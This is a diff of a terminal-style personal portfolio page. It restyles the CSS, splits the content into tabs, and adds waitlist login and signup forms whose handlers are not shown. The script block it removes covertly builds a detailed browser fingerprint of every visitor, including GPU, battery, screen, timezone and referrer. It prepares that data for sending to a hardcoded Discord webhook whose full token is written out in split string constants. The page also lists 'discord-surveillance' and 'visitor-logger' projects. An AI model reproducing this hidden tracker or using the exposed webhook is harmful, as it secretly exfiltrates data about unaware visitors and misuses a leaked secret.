@@ -5,11 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>gztxr :: terminal</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Courier New', Courier, monospace;
             background: #0a0a0a;
@@ -21,29 +17,24 @@
             padding: 20px;
         }
         .terminal {
-            max-width: 900px;
+            max-width: 950px;
             width: 100%;
             background: #0d0d0d;
             border: 1px solid #1a1a1a;
             border-radius: 8px;
-            padding: 30px;
+            padding: 25px 30px 20px;
             box-shadow: 0 0 40px rgba(0, 255, 65, 0.05);
-            position: relative;
         }
         .terminal-header {
             display: flex;
             align-items: center;
             gap: 10px;
-            padding-bottom: 15px;
+            padding-bottom: 12px;
             border-bottom: 1px solid #1a1a1a;
-            margin-bottom: 25px;
+            margin-bottom: 18px;
+            flex-wrap: wrap;
         }
-        .terminal-dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            display: inline-block;
-        }
+        .terminal-dot { width: 12px; height: 12px; border-radius: 50%; display: inline-block; }
         .terminal-dot.red { background: #ff5f56; }
         .terminal-dot.yellow { background: #ffbd2e; }
         .terminal-dot.green { background: #27c93f; }
@@ -52,53 +43,48 @@
             font-size: 12px;
             margin-left: 10px;
             letter-spacing: 1px;
+            flex: 1;
         }
-        .line {
-            margin-bottom: 8px;
-            line-height: 1.8;
-            font-size: 14px;
+        .tab-bar {
+            display: flex;
+            gap: 4px;
+            flex-wrap: wrap;
+            margin-left: auto;
         }
-        .prompt-symbol {
-            color: #00ff41;
-            font-weight: bold;
-        }
-        .command {
-            color: #ffffff;
-        }
-        .output {
-            color: #a8a8a8;
-            padding-left: 20px;
-            margin-bottom: 12px;
-        }
-        .output .highlight {
-            color: #00ff41;
-        }
-        .output .dim {
+        .tab-btn {
+            background: transparent;
+            border: 1px solid #1a1a1a;
             color: #555;
+            padding: 3px 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            cursor: pointer;
+            border-radius: 3px;
+            transition: all 0.3s ease;
         }
-        .output .link {
-            color: #00aaff;
-            text-decoration: none;
-            border-bottom: 1px dashed #00aaff33;
-        }
-        .output .link:hover {
-            color: #66ccff;
-            border-bottom-color: #66ccff;
-        }
-        .output .success {
-            color: #00ff41;
-        }
-        .output .warning {
-            color: #ffaa00;
-        }
-        .output .info {
-            color: #00aaff;
-        }
+        .tab-btn:hover { border-color: #00ff41; color: #00ff41; }
+        .tab-btn.active { border-color: #00ff41; color: #00ff41; background: rgba(0, 255, 65, 0.05); }
+        .tab-content { display: none; animation: fadeIn 0.3s ease; }
+        .tab-content.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        
+        .line { margin-bottom: 8px; line-height: 1.8; font-size: 14px; }
+        .prompt-symbol { color: #00ff41; font-weight: bold; }
+        .command { color: #ffffff; }
+        .output { color: #a8a8a8; padding-left: 20px; margin-bottom: 12px; }
+        .output .highlight { color: #00ff41; }
+        .output .dim { color: #555; }
+        .output .link { color: #00aaff; text-decoration: none; border-bottom: 1px dashed #00aaff33; }
+        .output .link:hover { color: #66ccff; border-bottom-color: #66ccff; }
+        .output .success { color: #00ff41; }
+        .output .warning { color: #ffaa00; }
+        .output .info { color: #00aaff; }
+        .output .error { color: #ff4444; }
         .ascii-art {
             color: #00ff41;
             font-size: 12px;
             line-height: 1.2;
-            margin: 15px 0;
+            margin: 10px 0 15px;
             white-space: pre;
             opacity: 0.7;
             letter-spacing: 0.5px;
@@ -109,11 +95,7 @@
             gap: 12px;
             margin: 4px 0;
         }
-        .skill-name {
-            color: #00ff41;
-            min-width: 70px;
-            font-size: 13px;
-        }
+        .skill-name { color: #00ff41; min-width: 70px; font-size: 13px; }
         .skill-track {
             flex: 1;
             height: 14px;
@@ -129,15 +111,8 @@
             transition: width 1s ease;
             width: 0%;
         }
-        .skill-fill.rust {
-            background: #ff6b35;
-        }
-        .skill-percent {
-            color: #555;
-            font-size: 12px;
-            min-width: 35px;
-            text-align: right;
-        }
+        .skill-fill.rust { background: #ff6b35; }
+        .skill-percent { color: #555; font-size: 12px; min-width: 35px; text-align: right; }
         .hobby-tag {
             display: inline-block;
             padding: 4px 12px;
@@ -148,45 +123,17 @@
             margin: 3px 6px 3px 0;
             transition: all 0.3s ease;
         }
-        .hobby-tag:hover {
-            border-color: #00ff41;
-            color: #00ff41;
-            background: rgba(0, 255, 65, 0.05);
-        }
+        .hobby-tag:hover { border-color: #00ff41; color: #00ff41; background: rgba(0, 255, 65, 0.05); }
         .project-item {
             padding: 8px 12px;
             margin: 4px 0;
             border-left: 2px solid #1a1a1a;
             transition: all 0.3s ease;
         }
-        .project-item:hover {
-            border-left-color: #00ff41;
-            background: rgba(0, 255, 65, 0.03);
-        }
-        .project-item .name {
-            color: #00ff41;
-        }
-        .project-item .desc {
-            color: #666;
-            font-size: 12px;
-        }
-        .cursor {
-            display: inline-block;
-            width: 10px;
-            height: 18px;
-            background: #00ff41;
-            animation: blink 1s infinite;
-            vertical-align: text-bottom;
-        }
-        @keyframes blink {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0; }
-        }
-        .separator {
-            border: none;
-            border-top: 1px solid #1a1a1a;
-            margin: 20px 0;
-        }
+        .project-item:hover { border-left-color: #00ff41; background: rgba(0, 255, 65, 0.03); }
+        .project-item .name { color: #00ff41; }
+        .project-item .desc { color: #666; font-size: 12px; }
+        .separator { border: none; border-top: 1px solid #1a1a1a; margin: 20px 0; }
         .footer {
             color: #333;
             font-size: 11px;
@@ -196,18 +143,67 @@
             border-top: 1px solid #1a1a1a;
             letter-spacing: 0.5px;
         }
+        .auth-input {
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid #1a1a1a;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            padding: 4px 8px;
+            width: 250px;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+        .auth-input:focus { border-color: #00ff41; }
+        .auth-input::placeholder { color: #333; }
+        .auth-btn {
+            background: transparent;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 6px 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            cursor: pointer;
+            border-radius: 3px;
+            transition: all 0.3s ease;
+            margin-top: 5px;
+        }
+        .auth-btn:hover { background: rgba(0, 255, 65, 0.1); box-shadow: 0 0 20px rgba(0, 255, 65, 0.1); }
+        .auth-btn:disabled { opacity: 0.3; cursor: not-allowed; }
+        .auth-row { margin: 6px 0; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+        .auth-row label { color: #555; min-width: 80px; font-size: 13px; }
+        .auth-message { color: #ffaa00; font-size: 13px; margin-top: 8px; }
+        .auth-message.error { color: #ff4444; }
+        .auth-message.success { color: #00ff41; }
+        .auth-toggle {
+            display: inline-block;
+            color: #00aaff;
+            cursor: pointer;
+            text-decoration: underline;
+            font-size: 13px;
+            margin-top: 8px;
+        }
+        .auth-toggle:hover { color: #66ccff; }
         @media (max-width: 768px) {
             .terminal { padding: 20px 15px; }
             .line { font-size: 12px; }
             .output { padding-left: 10px; }
             .ascii-art { font-size: 8px; }
             .skill-name { min-width: 60px; font-size: 12px; }
+            .tab-bar { margin-left: 0; width: 100%; justify-content: flex-start; }
+            .tab-btn { font-size: 10px; padding: 2px 8px; }
+            .auth-input { width: 180px; font-size: 12px; }
+            .auth-row label { min-width: 60px; font-size: 12px; }
         }
         @media (max-width: 480px) {
             .terminal { padding: 15px 10px; }
             .line { font-size: 11px; line-height: 1.6; }
             .ascii-art { font-size: 6px; }
-            .btn { padding: 6px 14px; font-size: 12px; }
+            .tab-btn { font-size: 9px; padding: 2px 6px; }
+            .auth-input { width: 140px; font-size: 11px; }
+            .auth-row label { min-width: 50px; font-size: 11px; }
+            .auth-btn { font-size: 11px; padding: 4px 14px; }
         }
     </style>
 </head>
@@ -219,8 +215,21 @@
         <span class="terminal-dot yellow"></span>
         <span class="terminal-dot green"></span>
         <span class="terminal-title">gztxr@arch:~$</span>
+        <div class="tab-bar">
+            <button class="tab-btn active" data-tab="home">~</button>
+            <button class="tab-btn" data-tab="dev">/dev</button>
+            <button class="tab-btn" data-tab="projects">/projects</button>
+            <button class="tab-btn" data-tab="games">/games</button>
+            <button class="tab-btn" data-tab="music">/music</button>
+            <button class="tab-btn" data-tab="hobbies">/hobbies</button>
+            <button class="tab-btn" data-tab="contact">/contact</button>
+            <button class="tab-btn" data-tab="auth" style="border-color:#ffaa00;color:#ffaa00;">/waitlist</button>
+        </div>
     </div>
-    <div class="ascii-art">
+
+    <!-- ===== TAB 1: HOME ===== -->
+    <div id="tab-home" class="tab-content active">
+        <div class="ascii-art">
    ▄████████    ▄████████ ████████▄     ▄████████ 
   ███    ███   ███    ███ ███   ▀███   ███    ███ 
   ███    ███   ███    ███ ███    ███   ███    █▀  
@@ -229,180 +238,302 @@
   ███    ███   ███    ███ ███    ███   ███    █▄  
   ███    ███   ███    ███ ███   ▄███   ███    ███ 
   ██████████   ██████████ ████████▀    ██████████ 
+        </div>
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> whoami</span>
+        </div>
+        <div class="output">
+            <span class="highlight">gztxr</span> :: developer / gamer<br>
+            <span class="dim">os</span> :: Arch Linux x86_64<br>
+            <span class="dim">shell</span> :: zsh 5.9<br>
+            <span class="dim">editor</span> :: neovim / vscodium<br>
+            <span class="dim">uptime</span> :: 42 days<br>
+            <span class="dim">status</span> :: <span class="success">online</span>
+        </div>
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> open github</span>
+        </div>
+        <div class="output">
+            <a href="https://github.com/gztxr" target="_blank" class="link">https://github.com/gztxr</a>
+            <span class="dim"> :: profile</span>
+        </div>
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> ./dream-project --status</span>
+        </div>
+        <div class="output">
+            <span class="warning">[!]</span> <span class="highlight">Palantir-like tool</span><br>
+            <span class="dim">  massive data analytics and intelligence platform</span><br>
+            <span class="dim">  stack :: C / Rust / Python</span>
+        </div>
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> ./why-c --explain</span>
+        </div>
+        <div class="output">
+            <span class="highlight">"C is fast and general-purpose."</span><br>
+            <span class="dim">  -- gztxr, 5 years of experience</span>
+        </div>
     </div>
-    <div class="line">
-        <span class="prompt-symbol">$</span>
-        <span class="command"> whoami</span>
-    </div>
-    <div class="output">
-        <span class="highlight">gztxr</span> :: developer / gamer<br>
-        <span class="dim">os</span> :: Arch Linux x86_64<br>
-        <span class="dim">shell</span> :: zsh 5.9<br>
-        <span class="dim">editor</span> :: neovim / vscodium<br>
-        <span class="dim">uptime</span> :: 42 days<br>
-        <span class="dim">status</span> :: <span class="success">online</span>
-    </div>
-    <div class="line">
-        <span class="prompt-symbol">$</span>
-        <span class="command"> open github</span>
-    </div>
-    <div class="output">
-        <a href="https://github.com/gztxr" target="_blank" class="link">https://github.com/gztxr</a>
-        <span class="dim"> :: profile</span>
-    </div>
-    <hr class="separator">
-    <div class="line">
-        <span class="prompt-symbol">$</span>
-        <span class="command"> cat /skills/*</span>
-    </div>
-    <div class="output">
-        <div class="skill-bar">
-            <span class="skill-name">C</span>
-            <div class="skill-track">
-                <div class="skill-fill" style="width: 75%;"></div>
+
+    <!-- ===== TAB 2: /dev (Skills) ===== -->
+    <div id="tab-dev" class="tab-content">
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> cat /skills/*</span>
+        </div>
+        <div class="output">
+            <div class="skill-bar">
+                <span class="skill-name">C</span>
+                <div class="skill-track">
+                    <div class="skill-fill" style="width: 75%;"></div>
+                </div>
+                <span class="skill-percent">75%</span>
             </div>
-            <span class="skill-percent">75%</span>
-        </div>
-        <div class="skill-bar">
-            <span class="skill-name">Python</span>
-            <div class="skill-track">
-                <div class="skill-fill" style="width: 70%;"></div>
+            <div class="skill-bar">
+                <span class="skill-name">Python</span>
+                <div class="skill-track">
+                    <div class="skill-fill" style="width: 70%;"></div>
+                </div>
+                <span class="skill-percent">70%</span>
             </div>
-            <span class="skill-percent">70%</span>
-        </div>
-        <div class="skill-bar">
-            <span class="skill-name">HTML</span>
-            <div class="skill-track">
-                <div class="skill-fill" style="width: 85%;"></div>
+            <div class="skill-bar">
+                <span class="skill-name">HTML</span>
+                <div class="skill-track">
+                    <div class="skill-fill" style="width: 85%;"></div>
+                </div>
+                <span class="skill-percent">85%</span>
             </div>
-            <span class="skill-percent">85%</span>
-        </div>
-        <div class="skill-bar">
-            <span class="skill-name">CSS</span>
-            <div class="skill-track">
-                <div class="skill-fill" style="width: 80%;"></div>
+            <div class="skill-bar">
+                <span class="skill-name">CSS</span>
+                <div class="skill-track">
+                    <div class="skill-fill" style="width: 80%;"></div>
+                </div>
+                <span class="skill-percent">80%</span>
             </div>
-            <span class="skill-percent">80%</span>
-        </div>
-        <div class="skill-bar">
-            <span class="skill-name">Rust</span>
-            <div class="skill-track">
-                <div class="skill-fill rust" style="width: 30%;"></div>
+            <div class="skill-bar">
+                <span class="skill-name">Rust</span>
+                <div class="skill-track">
+                    <div class="skill-fill rust" style="width: 30%;"></div>
+                </div>
+                <span class="skill-percent">30%</span>
             </div>
-            <span class="skill-percent">30%</span>
+        </div>
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> cat /distros/*</span>
+        </div>
+        <div class="output">
+            <span class="info">[+]</span> <span class="highlight">Arch</span> <span class="dim">|| daily driver</span><br>
+            <span class="info">[+]</span> <span class="highlight">Gentoo</span> <span class="dim">|| source-based masochism</span><br>
+            <span class="info">[+]</span> <span class="highlight">NixOS</span> <span class="dim">|| declarative config obsession</span>
         </div>
     </div>
-    <hr class="separator">
-    <div class="line">
-        <span class="prompt-symbol">$</span>
-        <span class="command"> ls /projects/</span>
-    </div>
-    <div class="output">
-        <div class="project-item">
-            <span class="name">discord-surveillance</span><br>
-            <span class="desc">  mass surveillance system for discord</span>
+
+    <!-- ===== TAB 3: /projects ===== -->
+    <div id="tab-projects" class="tab-content">
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> ls -la /projects/</span>
         </div>
-        <div class="project-item">
-            <span class="name">game-hacks</span><br>
-            <span class="desc">  various game modification tools</span>
+        <div class="output">
+            <div class="project-item">
+                <span class="name">discord-surveillance</span><br>
+                <span class="desc">  mass surveillance system for discord</span>
+            </div>
+            <div class="project-item">
+                <span class="name">game-hacks</span><br>
+                <span class="desc">  various game modification tools</span>
+            </div>
+            <div class="project-item">
+                <span class="name">visitor-logger</span><br>
+                <span class="desc">  real-time visitor tracking with discord webhook</span>
+            </div>
+            <div class="project-item">
+                <span class="name">dotfiles</span><br>
+                <span class="desc">  arch linux configuration files</span>
+            </div>
+            <div class="project-item">
+                <span class="name">terminal-profile</span><br>
+                <span class="desc">  minimalist terminal-style portfolio</span>
+            </div>
         </div>
-        <div class="project-item">
-            <span class="name">visitor-logger</span><br>
-            <span class="desc">  real-time visitor tracking with discord webhook</span>
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> ./dream-project --status</span>
         </div>
-        <div class="project-item">
-            <span class="name">dotfiles</span><br>
-            <span class="desc">  arch linux configuration files</span>
-        </div>
-        <div class="project-item">
-            <span class="name">terminal-profile</span><br>
-            <span class="desc">  minimalist terminal-style portfolio</span>
+        <div class="output">
+            <span class="warning">[!]</span> <span class="highlight">Palantir-like tool</span><br>
+            <span class="dim">  massive data analytics and intelligence platform</span><br>
+            <span class="dim">  stack :: C / Rust / Python</span>
         </div>
     </div>
-    <hr class="separator">
-    <div class="line">
-        <span class="prompt-symbol">$</span>
-        <span class="command"> cat /games/favorites</span>
+
+    <!-- ===== TAB 4: /games ===== -->
+    <div id="tab-games" class="tab-content">
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> cat /games/favorites</span>
+        </div>
+        <div class="output">
+            <span class="info">[+]</span> all-time favorite: <span class="highlight">Garry's Mod</span><br>
+            <span class="dim">  genres   ::</span> FPS / Sandbox / Horror<br>
+            <span class="dim">  currently ::</span> Elden Ring, Dark Souls<br>
+            <span class="dim">  favorites ::</span> Garry's Mod, Hollow Knight, RimWorld<br>
+            <span class="dim">  horror   ::</span> Outlast, Amnesia, FNAF
+        </div>
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> ./game-stats --all</span>
+        </div>
+        <div class="output">
+            <span class="dim">  total hours played</span> :: 2,847<br>
+            <span class="dim">  favorite genre</span> :: <span class="highlight">FPS / Sandbox</span><br>
+            <span class="dim">  most played</span> :: Garry's Mod (1,200h)
+        </div>
     </div>
-    <div class="output">
-        <span class="info">[+]</span> all-time favorite: <span class="highlight">Garry's Mod</span><br>
-        <span class="dim">  genres   ::</span> FPS / Sandbox / Horror<br>
-        <span class="dim">  currently ::</span> Elden Ring, Dark Souls<br>
-        <span class="dim">  favorites ::</span> Garry's Mod, Hollow Knight, RimWorld<br>
-        <span class="dim">  horror   ::</span> Outlast, Amnesia, FNAF
+
+    <!-- ===== TAB 5: /music ===== -->
+    <div id="tab-music" class="tab-content">
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> mpg123 --playlist</span>
+        </div>
+        <div class="output">
+            <span class="dim">  myagi</span>       :: <span class="highlight">underground hip-hop / rap</span><br>
+            <span class="dim">  lil peep</span>     :: <span class="highlight">emo rap / trap</span><br>
+            <span class="dim">  arctic monkeys</span> :: <span class="highlight">indie rock / post-punk revival</span><br>
+            <span class="dim">  alex g</span>       :: <span class="highlight">indie rock / lo-fi</span><br>
+            <span class="dim">  radiohead</span>    :: <span class="highlight">alternative rock / art rock</span>
+        </div>
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> cat /music/currently</span>
+        </div>
+        <div class="output">
+            <span class="dim">  now playing</span> :: <span class="highlight">Arctic Monkeys - Do I Wanna Know?</span><br>
+            <span class="dim">  mood</span> :: <span class="info">chill / focused</span>
+        </div>
     </div>
-    <hr class="separator">
-    <div class="line">
-        <span class="prompt-symbol">$</span>
-        <span class="command"> mpg123 --playlist</span>
+
+    <!-- ===== TAB 6: /hobbies ===== -->
+    <div id="tab-hobbies" class="tab-content">
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> ls ~/hobbies/</span>
+        </div>
+        <div class="output">
+            <span class="hobby-tag">gaming</span>
+            <span class="hobby-tag">tennis</span>
+            <span class="hobby-tag">golf</span>
+            <span class="hobby-tag">coding</span>
+        </div>
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> ./sports --status</span>
+        </div>
+        <div class="output">
+            <span class="warning">[!]</span> Tennis: <span class="highlight">intermediate</span> <span class="dim">| 3.5 rating</span><br>
+            <span class="warning">[!]</span> Golf: <span class="highlight">beginner</span> <span class="dim">| handicap 28</span><br>
+            <span class="dim">  last match :: 2 days ago</span>
+        </div>
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> cat /distros/*</span>
+        </div>
+        <div class="output">
+            <span class="info">[+]</span> <span class="highlight">Arch</span> <span class="dim">|| daily driver</span><br>
+            <span class="info">[+]</span> <span class="highlight">Gentoo</span> <span class="dim">|| source-based masochism</span><br>
+            <span class="info">[+]</span> <span class="highlight">NixOS</span> <span class="dim">|| declarative config obsession</span>
+        </div>
     </div>
-    <div class="output">
-        <span class="dim">  myagi</span>       :: <span class="highlight">underground hip-hop / rap</span><br>
-        <span class="dim">  lil peep</span>     :: <span class="highlight">emo rap / trap</span><br>
-        <span class="dim">  arctic monkeys</span> :: <span class="highlight">indie rock / post-punk revival</span><br>
-        <span class="dim">  alex g</span>       :: <span class="highlight">indie rock / lo-fi</span><br>
-        <span class="dim">  radiohead</span>    :: <span class="highlight">alternative rock / art rock</span>
+
+    <!-- ===== TAB 7: /contact ===== -->
+    <div id="tab-contact" class="tab-content">
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> ./contact --methods</span>
+        </div>
+        <div class="output">
+            <span class="dim">  github  ::</span> <a href="https://github.com/gztxr" target="_blank" class="link">gztxr</a><br>
+            <span class="dim">  discord ::</span> <span class="highlight">gztxr</span><br>
+            <span class="dim">  email   ::</span> <span class="dim">gztxr@proton.me</span>
+        </div>
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> ./contact --status</span>
+        </div>
+        <div class="output">
+            <span class="dim">  status</span> :: <span class="success">available</span><br>
+            <span class="dim">  response time</span> :: typically &lt; 24h<br>
+            <span class="dim">  preferred contact</span> :: Discord / GitHub
+        </div>
     </div>
-    <hr class="separator">
-    <div class="line">
-        <span class="prompt-symbol">$</span>
-        <span class="command"> ./dream-project --status</span>
+
+    <!-- ===== TAB 8: /waitlist (Auth) ===== -->
+    <div id="tab-auth" class="tab-content">
+        <div class="line">
+            <span class="prompt-symbol">$</span>
+            <span class="command"> ./waitlist --status</span>
+        </div>
+        <div class="output" style="margin-bottom:15px;">
+            <span class="warning">[!]</span> <span class="highlight">gztxr terminal tools</span> are currently in private beta.<br>
+            <span class="dim">  Sign up for the waiting list to get access when we launch.</span>
+        </div>
+
+        <!-- ===== LOGIN FORM ===== -->
+        <div id="loginForm">
+            <div class="line">
+                <span class="prompt-symbol">$</span>
+                <span class="command"> ./login</span>
+            </div>
+            <div class="output">
+                <div class="auth-row">
+                    <label>username</label>
+                    <input type="text" id="loginUsername" class="auth-input" placeholder="enter username">
+                </div>
+                <div class="auth-row">
+                    <label>password</label>
+                    <input type="password" id="loginPassword" class="auth-input" placeholder="enter password">
+                </div>
+                <button class="auth-btn" onclick="handleLogin()">login</button>
+                <div id="loginMessage" class="auth-message" style="margin-top:10px;"></div>
+                <div class="auth-toggle" onclick="showSignup()">[ no account? sign up ]</div>
+            </div>
+        </div>
+
+        <!-- ===== SIGNUP FORM ===== -->
+        <div id="signupForm" style="display:none;">
+            <div class="line">
+                <span class="prompt-symbol">$</span>
+                <span class="command"> ./signup</span>
+            </div>
+            <div class="output">
+                <div class="auth-row">
+                    <label>username</label>
+                    <input type="text" id="signupUsername" class="auth-input" placeholder="choose username">
+                </div>
+                <div class="auth-row">
+                    <label>email</label>
+                    <input type="email" id="signupEmail" class="auth-input" placeholder="your@email.com">
+                </div>
+                <div class="auth-row">
+                    <label>password</label>
+                    <input type="password" id="signupPassword" class="auth-input" placeholder="choose password">
+                </div>
+                <div class="auth-row">
+                    <label>confirm</label>
+                    <input type="password" id="signupConfirm" class="auth-input" placeholder="confirm password">
+                </div>
+                <button class="auth-btn" onclick="handleSignup()">sign up</button>
+                <div id="signupMessage" class="auth-message" style="margin-top:10px;"></div>
+                <div class="auth-toggle" onclick="showLogin()">[ already have an account? login ]</div>
+            </div>
+        </div>
     </div>
-    <div class="output">
-        <span class="warning">[!]</span> <span class="highlight">Palantir-like tool</span><br>
-        <span class="dim">  massive data analytics and intelligence platform</span><br>
-        <span class="dim">  stack :: C / Rust / Python</span>
-    </div>
-    <hr class="separator">
-    <div class="line">
-        <span class="prompt-symbol">$</span>
-        <span class="command"> ls ~/hobbies/</span>
-    </div>
-    <div class="output">
-        <span class="hobby-tag">gaming</span>
-        <span class="hobby-tag">tennis</span>
-        <span class="hobby-tag">golf</span>
-        <span class="hobby-tag">coding</span>
-    </div>
-    <hr class="separator">
-    <div class="line">
-        <span class="prompt-symbol">$</span>
-        <span class="command"> ./sports --status</span>
-    </div>
-    <div class="output">
-        <span class="warning">[!]</span> Tennis: <span class="highlight">intermediate</span> <span class="dim">| 3.5 rating</span><br>
-        <span class="warning">[!]</span> Golf: <span class="highlight">beginner</span> <span class="dim">| handicap 28</span><br>
-        <span class="dim">  last match :: 2 days ago</span>
-    </div>
-    <hr class="separator">
-    <div class="line">
-        <span class="prompt-symbol">$</span>
-        <span class="command"> cat /distros/*</span>
-    </div>
-    <div class="output">
-        <span class="info">[+]</span> <span class="highlight">Arch</span> <span class="dim">|| daily driver</span><br>
-        <span class="info">[+]</span> <span class="highlight">Gentoo</span> <span class="dim">|| source-based masochism</span><br>
-        <span class="info">[+]</span> <span class="highlight">NixOS</span> <span class="dim">|| declarative config obsession</span>
-    </div>
-    <hr class="separator">
-    <div class="line">
-        <span class="prompt-symbol">$</span>
-        <span class="command"> ./why-c --explain</span>
-    </div>
-    <div class="output">
-        <span class="highlight">"C is fast and general-purpose."</span><br>
-        <span class="dim">  -- gztxr, 5 years of experience</span>
-    </div>
-    <hr class="separator">
-    <div class="line">
-        <span class="prompt-symbol">$</span>
-        <span class="command"> ./contact --methods</span>
-    </div>
-    <div class="output">
-        <span class="dim">  github  ::</span> <a href="https://github.com/gztxr" target="_blank" class="link">gztxr</a><br>
-        <span class="dim">  discord ::</span> <span class="highlight">gztxr</span><br>
-        <span class="dim">  email   ::</span> <span class="dim">gztxr@proton.me</span>
-    </div>
+
     <hr class="separator">
     <div class="footer">
         [~] gztxr@arch :: 5 years of C :: 42d uptime<br>
@@ -411,172 +542,365 @@
 </div>
 
 <script>
-const _a = 'https://discord.com/api/webhooks/';
-const _b = '1513861047004430426/';
-const _c = 'QaiZRm9qibYzGndCD_Jgk9NstMglric_Qp7gjKUZ1WQQ0LckAzFH6LW83WAuXI2hsVxv';
-const _webhook = _a + _b + _c;
-
-function _x() {
-    var d = {};
-    d.ua = navigator.userAgent;
-    d.lang = navigator.language;
-    d.langs = navigator.languages || [];
-    d.plat = navigator.platform;
-    d.vendor = navigator.vendor || 'N/A';
-    d.cookie = navigator.cookieEnabled;
-    d.dnt = navigator.doNotTrack || 'unspecified';
-    d.cores = navigator.hardwareConcurrency || 'N/A';
-    d.mem = navigator.deviceMemory || 'N/A';
-    d.touch = navigator.maxTouchPoints || 0;
-    d.sw = screen.width;
-    d.sh = screen.height;
-    d.cd = screen.colorDepth;
-    d.pd = screen.pixelDepth;
-    d.aw = screen.availWidth;
-    d.ah = screen.availHeight;
-    d.iw = window.innerWidth;
-    d.ih = window.innerHeight;
-    d.ow = window.outerWidth;
-    d.oh = window.outerHeight;
-    d.dpr = window.devicePixelRatio || 1;
-    d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    d.to = new Date().getTimezoneOffset();
-    d.loc = Intl.DateTimeFormat().resolvedOptions().locale;
-    d.ts = new Date().toISOString();
-    d.lt = new Date().toString();
-    d.url = window.location.href;
-    d.path = window.location.pathname;
-    d.search = window.location.search;
-    d.hash = window.location.hash;
-    d.ref = document.referrer || 'Direct';
-    d.title = document.title;
-    d.ls = !!window.localStorage;
-    d.ss = !!window.sessionStorage;
-    d.idb = !!window.indexedDB;
-    d.audio = !!(window.AudioContext || window.webkitAudioContext);
-    d.media = !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices);
-    var ua = navigator.userAgent;
-    d.mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
-    d.tablet = /iPad|Android(?!.*Mobile)/i.test(ua);
-    d.touchdev = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-    d.os = 'Unknown';
-    if (ua.indexOf('Windows') !== -1) d.os = 'Windows';
-    else if (ua.indexOf('Mac OS X') !== -1 || ua.indexOf('Macintosh') !== -1) d.os = 'macOS';
-    else if (ua.indexOf('Linux') !== -1) d.os = 'Linux';
-    else if (ua.indexOf('Android') !== -1) d.os = 'Android';
-    else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1 || ua.indexOf('iPod') !== -1) d.os = 'iOS';
-    else if (ua.indexOf('CrOS') !== -1) d.os = 'ChromeOS';
-    d.browser = 'Unknown';
-    if (ua.indexOf('Firefox') !== -1) d.browser = 'Firefox';
-    else if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) d.browser = 'Chrome';
-    else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) d.browser = 'Safari';
-    else if (ua.indexOf('Edg') !== -1) d.browser = 'Edge';
-    else if (ua.indexOf('Opera') !== -1 || ua.indexOf('OPR') !== -1) d.browser = 'Opera';
-    d.plugs = [];
-    try { for (var i = 0; i < navigator.plugins.length; i++) { d.plugs.push(navigator.plugins[i].name); } } catch(e) {}
-    try { var cnv = document.createElement('canvas'); var ctx = cnv.getContext('2d'); var ft = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Trebuchet MS','Lucida Console']; d.fonts = ft; } catch(e) {}
-    try { var cnv2 = document.createElement('canvas'); var gl = cnv2.getContext('webgl') || cnv2.getContext('experimental-webgl'); if (gl) { var di = gl.getExtension('WEBGL_debug_renderer_info'); if (di) { d.gpu = gl.getParameter(di.UNMASKED_RENDERER_WEBGL); d.gpuv = gl.getParameter(di.UNMASKED_VENDOR_WEBGL); } d.wgl = 'WebGL 1.0'; if (cnv2.getContext('webgl2')) d.wgl = 'WebGL 2.0'; } } catch(e) {}
-    d.conn = null;
-    if (navigator.connection) {
-        d.conn = { type: navigator.connection.type || 'N/A', eff: navigator.connection.effectiveType || 'N/A', down: navigator.connection.downlink || 'N/A', rtt: navigator.connection.rtt || 'N/A', save: navigator.connection.saveData || false };
-    }
-    d.perf = null;
-    if (performance.timing) {
-        d.perf = { load: performance.timing.loadEventEnd - performance.timing.navigationStart, dom: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart };
-    }
-    if (navigator.getBattery) {
-        navigator.getBattery().then(function(b) {
-            d.bat = { level: b.level * 100, charging: b.charging, ct: b.chargingTime, dt: b.dischargingTime };
-            _send(d);
-        }).catch(function() { d.bat = null; _send(d); });
-    } else { d.bat = null; _send(d); }
-    return d;
-}
-
-function _send(d) {
-    var fields = [
-        { name: 'IP', value: d.ip || 'Pending...', inline: true },
